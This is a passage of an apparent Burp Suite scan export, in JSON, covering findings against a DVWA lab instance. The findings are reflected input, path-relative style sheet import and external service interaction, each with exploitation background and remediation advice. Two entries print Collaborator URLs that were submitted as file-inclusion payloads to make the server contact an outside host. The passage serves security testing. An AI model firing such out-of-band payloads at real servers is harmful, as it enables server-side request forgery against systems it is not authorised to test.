        "issue__issueBackground": "<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>",
        "issue__remediationBackground": "",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/20.html\">CWE-20: Improper Input Validation</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>filename</b> multipart parameter attribute is copied into the application's response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "73": {
        "\ufeffissue__serialNumber": "5.38199E+18",
        "issue__type": "2097960",
        "issue__name": "Path-relative style sheet import",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/view_help.php",
        "issue__location": "/dvwa/vulnerabilities/view_help.php",
        "issue__severity": "Information",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>\\n<ol>\\n<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at \"/original-path/file.php\" might import \"styles/main.css\").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, \"/original-path/file.php/extra-junk/\"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>\\n<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL \"/original-path/file.php/extra-junk/styles/main.css\"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>\\n<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>\\n<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>\\n<ul>\\n  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>\\n<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>",
        "issue__remediationBackground": "<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>\\n<ul><li>Setting the HTTP response header \"X-Frame-Options: deny\" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. \"&lt;!doctype html&gt;\") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>\\n<li>Setting the HTTP response header \"X-Content-Type-Options: nosniff\" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>",
        "issue__references": "<ul><li><a href=\"https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities\">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/16.html\">CWE-16: Configuration</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/154.html\">CAPEC-154: Resource Location Spoofing</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/468.html\">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>\\n</ul>",
        "issue__issueDetail": "The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "74": {
        "\ufeffissue__serialNumber": "5.26437E+18",
        "issue__type": "3146256",
        "issue__name": "External service interaction (HTTP)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/fi/",
        "issue__location": "/dvwa/vulnerabilities/fi/ [page parameter]",
        "issue__severity": "High",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application.\\nHowever, in many cases, it can indicate a vulnerability with serious consequences.</p>\\n<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy.\\n  By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. \\n  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. \\n  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. </p>",
        "issue__remediationBackground": "<p>You should review the purpose and intended use of the relevant application functionality, \\n  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. \\n  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. \\n  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>\\n<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>\\n\\n<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>",
        "issue__references": "<ul>\\n  <li><a href=\"https://portswigger.net/blog/introducing-burp-collaborator\">Burp Collaborator</a></li>\\n  <li><a href=\"https://portswigger.net/burp/application-security-testing/oast\">Out-of-band application security testing (OAST)</a></li>\\n  <li><a href=\"https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface\">PortSwigger Research: Cracking the Lens</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/918.html\">CWE-918: Server-Side Request Forgery (SSRF)</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/406.html\">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li>\\n</ul>",
        "issue__issueDetail": "It is possible to induce the application to perform server-side HTTP and HTTPS requests to arbitrary domains.<br><br>The payload <b>http://rgb75t1y60x1bye97mmhu6p1ssylmja9y0lq9f.burpcollaborator.net/?file1.php</b> was submitted in the <b>page</b> parameter.<br><br>The application performed an HTTP request to the specified domain.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "HTTP",
        "issue__collaboratorEvent__originIp": "49.228.238.103",
        "issue__collaboratorEvent__time": "2022-Mar-10 10:11:07 UTC",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "75": {
        "\ufeffissue__serialNumber": "5.4849E+17",
        "issue__type": "3146240",
        "issue__name": "External service interaction (DNS)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/fi/",
        "issue__location": "/dvwa/vulnerabilities/fi/ [page parameter]",
        "issue__severity": "High",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application.\\nHowever, in many cases, it can indicate a vulnerability with serious consequences.</p>\\n<p>In cases where DNS-based interactions can be triggered, it is normally possible to trigger interactions using other service types, and these are reported as separate issues. \\n  If a payload that specifies a particular service type (e.g. a URL) triggers only a DNS-based interaction, \\n  then this strongly indicates that the application attempted to connect using that other service, \\n  but was prevented from doing so by egress filters in place at the network layer. The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy.\\n  By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. \\n  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. \\n  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. </p>",
        "issue__remediationBackground": "<p>You should review the purpose and intended use of the relevant application functionality, \\n  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. \\n  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. \\n  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>\\n<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>\\n\\n<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>",
        "issue__references": "<ul>\\n  <li><a href=\"https://portswigger.net/blog/introducing-burp-collaborator\">Burp Collaborator</a></li>\\n <li><a href=\"https://portswigger.net/burp/application-security-testing/oast\">Out-of-band application security testing (OAST)</a></li>\\n  <li><a href=\"https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface\">PortSwigger Research: Cracking the Lens</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/918.html\">CWE-918: Server-Side Request Forgery (SSRF)</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/406.html\">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li>\\n</ul>",
        "issue__issueDetail": "It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.<br><br>The payload <b>https://vtsbixe2j4a5o2rdkqzl7a255wbpznneb5yvmk.burpcollaborator.net/?file1.php</b> was submitted in the <b>page</b> parameter.<br><br>The application performed a DNS lookup of the specified domain.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "DNS",
        "issue__collaboratorEvent__originIp": "49.231.105.252",
        "issue__collaboratorEvent__time": "2022-Mar-10 10:11:01 UTC",
        "issue__collaboratorEvent__lookupType": "AAAA",
        "issue__collaboratorEvent__lookupHost": "vtsbixe2j4a5o2rdkqzl7a255wbpznneb5yvmk.burpcollaborator.net"
    },
    "76": {
        "\ufeffissue__serialNumber": "5.38928E+18",
        "issue__type": "2097960",
        "issue__name": "Path-relative style sheet import",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/instructions.php",
        "issue__location": "/dvwa/instructions.php",
        "issue__severity": "Information",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>\\n<ol>\\n<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at \"/original-path/file.php\" might import \"styles/main.css\").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, \"/original-path/file.php/extra-junk/\"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>\\n<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL \"/original-path/file.php/extra-junk/styles/main.css\"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>\\n<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>\\n<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>\\n<ul>\\n  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>\\n<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>",
        "issue__remediationBackground": "<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>\\n<ul><li>Setting the HTTP response header \"X-Frame-Options: deny\" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. \"&lt;!doctype html&gt;\") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>\\n<li>Setting the HTTP response header \"X-Content-Type-Options: nosniff\" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>",
        "issue__references": "<ul><li><a href=\"https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities\">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/16.html\">CWE-16: Configuration</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/154.html\">CAPEC-154: Resource Location Spoofing</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/468.html\">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>\\n</ul>",
        "issue__issueDetail": "The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "77": {
        "\ufeffissue__serialNumber": "2.78772E+18",
        "issue__type": "4197376",
        "issue__name": "Input returned in response (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/phpinfo.php",
        "issue__location": "/dvwa/phpinfo.php [Referer HTTP header]",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>",
        "issue__remediationBackground": "",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/20.html\">CWE-20: Improper Input Validation</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>Referer</b> HTTP header is copied into the application's response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
